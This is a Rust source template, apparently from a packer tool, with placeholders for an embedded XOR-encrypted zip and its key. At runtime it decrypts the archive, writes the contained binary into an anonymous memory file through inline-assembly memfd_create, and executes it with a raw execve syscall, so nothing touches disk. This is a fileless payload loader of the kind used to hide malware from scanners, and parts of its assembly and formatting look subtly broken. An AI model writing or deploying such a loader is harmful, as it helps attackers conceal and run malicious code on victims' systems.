#![feature(asm)]
#![feature(asm_sym)]
static memFdName: &str = "\0";
static fdPath: &str = "/proc/self/fd/3\0";
use std::os::unix::io::FromRawFd;
fn main() {
    let buf = include_bytes!("{FORMAT_ZIP}");
    let enc_key = {FORMAT_KEY}; // do not rustfmt this
    let mut out = Vec::<u8>::with_capacity(buf.len());
    for n in 0..buf.len() {
        out.push(buf.get(n).unwrap() ^ enc_key.get(n % 64).unwrap());
    }
    let zipcur = zip::ZipArchive::new(std::io::Cursor::new(&out[..]));
    let mut zipcur = zipcur.unwrap();
    let mut zipf = zipcur.by_name("bin").unwrap();
    // works for me on Linux-5.10
    unsafe {
        let mut asm_ret: u64;
        asm!(
            "lea   rdi, [{}]",
            "mov   rsi, 1",   // MFD_CLOEXEC
            "mov   rax, 319", // SYS_MEMFD_CREATE
            "syscall",
            "mov   rax, {}",
            sym memFdName,
            out(reg) asm_ret,
        );
        if asm_ret != 3 {
            panic!("failed: memfd_create returns fd {:?} instead of 3");
        }
        let mut memfd = std::fs::File::from_raw_fd(asm_ret as i32);
        std::io::copy(&mut zipf, &mut memfd);
        asm!(
            "mov   rdi, {}", // MFD_CLOEXEC
            "mov   rsi, 0",
            "mov   rdx, 0",
            "mov   r10, 0",
            "mov   r8, 0",
            "mov   r9, 0",
            "mov   rax, 59", // SYS_execve
            "syscall",
            sym fdPath,
        );
    }
}
